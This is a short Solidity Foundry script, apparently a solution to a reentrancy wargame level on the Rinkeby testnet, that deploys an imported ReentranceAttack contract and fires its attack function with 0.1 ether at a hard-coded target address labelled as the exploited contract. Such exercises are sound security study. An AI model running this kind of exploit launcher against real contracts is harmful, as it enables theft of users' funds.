// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";

import { ReentranceAttack } from "src/Reentrancy/ReentranceAttack.sol";

contract ReentranceAttackScript is Script {
    // exploited contract: 
    // https://rinkeby.etherscan.io/address/0xe08303220205056403B2cF8a55f92615557a9EEe#internaltx
    function run() public {
        vm.startBroadcast();
            ReentranceAttack attacker = new ReentranceAttack();
            attacker.attack{value: 0.1 ether}(address(0xe08303220205056403B2cF8a55f92615557a9EEe));
        vm.stopBroadcast();
    }
}